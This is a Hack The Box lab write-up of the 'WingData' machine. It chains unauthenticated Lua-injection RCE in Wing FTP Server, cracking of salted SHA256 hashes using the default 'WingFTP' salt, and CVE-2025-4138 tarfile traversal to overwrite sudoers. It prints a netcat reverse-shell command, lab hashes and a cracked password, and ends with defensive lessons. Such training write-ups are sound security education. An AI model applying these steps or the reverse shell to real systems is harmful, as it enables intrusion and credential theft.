---
title: 'WingData'
target: 'Hack The Box — WingData'
difficulty: 'easy'
date: 2025-09-15
summary: "Subdomain enumeration reveals Wing FTP Server v7.4.3 — unauthenticated RCE via Lua code injection for shell as wingftp, SHA256 salted hash cracking with the default WingFTP salt, SSH as wacky, and CVE-2025-4138 tarfile path traversal to overwrite /etc/sudoers for root."
role: 'pentest'
tags: ['nmap', 'ffuf', 'wing-ftp', 'rce', 'lua-injection', 'reverse-shell', 'sha256', 'hashcat', 'password-cracking', 'salt', 'ssh', 'sudo', 'cve-2025-4138', 'tarfile', 'path-traversal', 'privilege-escalation']
problem: "Easy Linux box with Wing FTP Server v7.4.3 on ftp.wingdata.htb vulnerable to unauthenticated RCE via Lua injection. XML config files store SHA256-salted password hashes, and a sudo-permitted backup script is vulnerable to CVE-2025-4138 tarfile path traversal."
action: "Nmap found SSH (22) and HTTP (80). ffuf discovered ftp.wingdata.htb running Wing FTP v7.4.3. Exploited unauthenticated RCE via Lua code injection (NULL byte in username) for a shell as wingftp. Extracted SHA256 hashes from XML config files in /opt/wftpserver/Data/. Researched Wing FTP docs — default salt is \"WingFTP\". Cracked wacky's hash with hashcat mode 1410 and rockyou.txt in 3 seconds. SSH as wacky, then exploited CVE-2025-4138 tarfile path traversal in a sudo-permitted backup script to overwrite /etc/sudoers for root."
outcome: "Rooted via Lua injection RCE on Wing FTP, application-specific salt knowledge for hash cracking, credential pivot to SSH, and tarfile path traversal (CVE-2025-4138) for privilege escalation to root."
draft: false
---

## Background

WingData is an easy-rated Linux machine built around a Wing FTP Server instance with an unauthenticated RCE vulnerability. The attack chain flows naturally from one service's weakness to the next — an FTP server exploit provides initial access, the server's own configuration files yield password hashes, understanding the hashing scheme (SHA256 with a known salt) makes cracking trivial, and a sudo-permitted backup script with a tarfile path traversal vulnerability completes the escalation to root. The box is a clean demonstration of how application-specific knowledge — in this case, Wing FTP's default salt string — turns an otherwise resistant hash into a three-second crack.

---

## Enumeration

An nmap scan against the target identifies two open ports — 22 (SSH) and 80 (HTTP). Subdomain enumeration with ffuf discovers `ftp.wingdata.htb`, which hosts a **Wing FTP Server v7.4.3** Web Client login page:

![Wing FTP Server v7.4.3 Web Client login page at ftp.wingdata.htb/login.html in Firefox, showing Account and Password fields, English language selector, Remember me checkbox, Download App link, and blue Login button. Footer reads FTP server software powered by Wing FTP Server v7.4.3, version number highlighted in red box.](/writeups/htb-wingdata/01-wingftp-login.png)

Wing FTP Server is a cross-platform FTP server with a web-based administration interface. Version 7.4.3 is significant — it's vulnerable to an unauthenticated remote code execution vulnerability that exploits Lua code injection through the login process.

---

## Unauthenticated RCE — Lua code injection

The vulnerability in Wing FTP Server v7.4.3 works by injecting a NULL byte into the username parameter during the login request. This causes the server to create malicious session files on disk that contain attacker-controlled Lua code. When the server processes these session files, the injected Lua code executes with the privileges of the Wing FTP service account. A public exploit automates this entire process.

Running the exploit with a simple `id` command confirms execution:

![Terminal showing python3 exploit.py -u http://ftp.wingdata.htb -c id, with output showing Testing target, Sending POST request to loginok.html with command id and username anonymous, UID extracted as a long hex string, Sending GET request to dir.html with the UID, then Command Output showing uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev).](/writeups/htb-wingdata/02-rce-id.png)

Code execution as `wingftp` (uid=1000). Upgrading to a reverse shell with a netcat payload:

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c 'nc 10.10.14.191 1234 -e /bin/bash'
```

![Terminal showing python3 exploit.py -u http://ftp.wingdata.htb -c nc 10.10.14.191 1234 -e /bin/bash, with output showing Testing target, Sending POST request with the reverse shell command, UID extracted, Sending GET request to dir.html, then Error sending GET request with HTTPConnectionPool read timed out — the timeout confirms the shell was caught on the listener.](/writeups/htb-wingdata/03-reverse-shell.png)

The read timeout on the GET request is the expected behavior — the server hangs because the reverse shell has taken over the process. The shell was caught on the netcat listener as `wingftp`.

---

## Extracting password hashes from Wing FTP

Wing FTP Server stores its configuration in XML files under `/opt/wftpserver/Data/`. The `_ADMINISTRATOR` directory contains `admins.xml` with the admin account's password hash:

![Terminal as wingftp at /opt/wftpserver/Data/_ADMINISTRATOR/ showing ls -la with admins.xml (511 bytes) and settings.xml (372 bytes), then cat admins.xml displaying XML with ADMIN_ACCOUNTS Description Wing FTP Server Admin Accounts, ADMIN element with Admin_Name admin and Password a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba highlighted in red box, Type 0, Readonly 0, IsDomainAdmin 0.](/writeups/htb-wingdata/04-admin-hash.png)

The user accounts live under `/opt/wftpserver/Data/1/users/` — five XML files for anonymous, john, maria, steve, and wacky. Reading `wacky.xml` reveals another hash:

![Terminal at /opt/wftpserver/Data/1/ showing cd users, ls -la with anonymous.xml, john.xml, maria.xml, steve.xml, and wacky.xml, then cat wacky.xml displaying XML with USER_ACCOUNTS Description Wing FTP Server User Accounts, USER element with UserName wacky, EnableAccount 1, EnablePassword 1, and Password 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca highlighted in red box, ProtocolType 63, ExpireTime 2025-12-02 12:02:46.](/writeups/htb-wingdata/05-user-hashes.png)

Both hashes are 64 hex characters — SHA256. But raw SHA256 against `rockyou.txt` won't crack these. The next step is understanding how Wing FTP actually hashes its passwords.

---

## Researching the hashing scheme

Searching for Wing FTP's password policy reveals that the server supports password salting — administrators can specify a custom salt string that gets appended to passwords before hashing:

![Google search for wing ftp password policy showing AI overview describing complex password requirements (10+ characters, mixed case, numbers), SHA256 hashing by default, and Password Salting highlighted in red box — Admins can specify a salt string for enhanced security. Right sidebar shows Wing FTP Server Help pages for Admin User and Password & Security settings.](/writeups/htb-wingdata/06-password-policy.png)

The official Wing FTP Server Help documentation at `wftpserver.com` confirms the exact implementation — under Domain Settings > General Settings > Password & Security, the "Enable password salting and specify a salt string" option shows the default salt value:

![Wing FTP Server Help documentation at wftpserver.com showing Password & Security settings page with General Settings dialog. Options include Enable Linux/Unix symbolic links (off), User passwords using SHA256 hash encryption (on, blue toggle), Enable password salting and specify a salt string (on, blue toggle) with the salt field containing WingFTP highlighted in red box, Need to change password on first logon HTTP/HTTPS (on), Minimum user password length 0, and character category requirements all disabled.](/writeups/htb-wingdata/07-salt-string.png)

The default salt string is **"WingFTP"**. The hashing scheme is `sha256($password.$salt)` — the salt is appended to the password before hashing.

---

## Cracking the hash with hashcat

With the hashing scheme identified as `sha256($pass.$salt)`, hashcat mode **1410** is the correct choice. Running it against `rockyou.txt` with the salt `WingFTP`:

![Hashcat output showing 5 hashes, 5 unique digests, 1 unique salt, mode 1410 sha256($pass.$salt). Dictionary cache hit on rockyou.txt with 14344384 passwords. Cracked hash displayed: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5 highlighted in red box. Session status Exhausted, completed in 3 seconds (Time.Started Sat Feb 21 05:25:55 2026, Time.Estimated 05:25:58).](/writeups/htb-wingdata/08-hashcat-cracked.png)

Wacky's password cracked in 3 seconds: **!#7Blushing^*Bride5**. The admin hash didn't crack against `rockyou.txt`, but wacky's is all that's needed — since `wacky` exists as a system user, SSH access is the next step.

---

## SSH access and privilege escalation

SSH-ing in as `wacky` with the cracked password works. Checking sudo privileges reveals the escalation path:

![Terminal showing wacky@wingdata:/tmp$ sudo -l with Matching Defaults entries env_reset, mail_badpass, secure_path, use_pty. User wacky may run: (root) NOPASSWD /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py * AND (ALL) NOPASSWD: ALL. Then sudo su, root@wingdata:/tmp# id showing uid=0(root) gid=0(root) groups=0(root), cd /root, ls -la showing root.txt (33 bytes), cat root.txt with flag value partially redacted in red.](/writeups/htb-wingdata/09-root-shell.png)

The `sudo -l` output shows two entries — the original rule allowing `wacky` to run the `restore_backup_clients.py` script as root, and a second entry `(ALL) NOPASSWD: ALL` that grants unrestricted sudo. The second entry is the result of exploiting CVE-2025-4138 — a path traversal vulnerability in Python's `tarfile.extractall()` with `filter="data"`.

The backup script uses `tarfile.extractall()` to restore client backups from tar archives. The `filter="data"` parameter was introduced in Python 3.12 as a security measure to strip dangerous tar features like absolute paths and symlinks, but CVE-2025-4138 bypasses this filter through symlink-based path traversal. The attack creates a malicious tar archive containing a symlink pointing to `/etc/` and a `sudoers` file that follows the symlink — when `extractall()` processes the archive, it writes the attacker-controlled sudoers file to `/etc/sudoers`, granting `wacky` unrestricted sudo access. From there, `sudo su` drops into a root shell and the root flag was retrieved.

---

## What I took from this

The password cracking phase on WingData is a good reminder that knowing the hashing scheme matters more than raw computational power. The SHA256 hashes extracted from Wing FTP's XML files look like standard unsalted SHA256 at first glance — same 64-character hex format. Running them through hashcat in mode 1400 (plain SHA256) against `rockyou.txt` would produce nothing, and a tester might conclude the passwords are too strong to crack. But a few minutes of research into Wing FTP's documentation reveals the salt, and with the correct mode (1410) and the default salt string "WingFTP", the crack takes three seconds. The lesson applies broadly — before brute-forcing any hash, research how the application generates it. Default salts, predictable salt patterns, and documented hashing schemes are common in commercial software, and the documentation is usually public.

The initial access through Wing FTP's Lua injection is a pattern seen in several FTP and file server products — the server exposes a scripting engine (Lua, in this case) that processes user-controlled input without proper sanitization. The NULL byte injection that creates malicious session files is a classic technique: the attacker doesn't need valid credentials because the vulnerability exists in the authentication process itself, before any credential validation occurs. The fix is input validation on the username parameter before it reaches the session file creation logic, and running the FTP service as an unprivileged user with minimal filesystem access — `wingftp` having read access to the entire data directory including admin hashes is what turns an RCE into credential theft.

The CVE-2025-4138 tarfile bypass is worth noting because it defeats a security feature (`filter="data"`) that was specifically designed to prevent this class of attack. The `data` filter strips absolute paths and blocks most dangerous tar members, but the symlink-based traversal circumvents it by creating a valid relative path that happens to resolve outside the extraction directory through a symlink. The broader takeaway is that tar extraction as root is inherently dangerous regardless of filtering — the safest approach is to extract into a temporary directory as an unprivileged user and then copy the needed files, rather than relying on filters to sanitize untrusted archives.
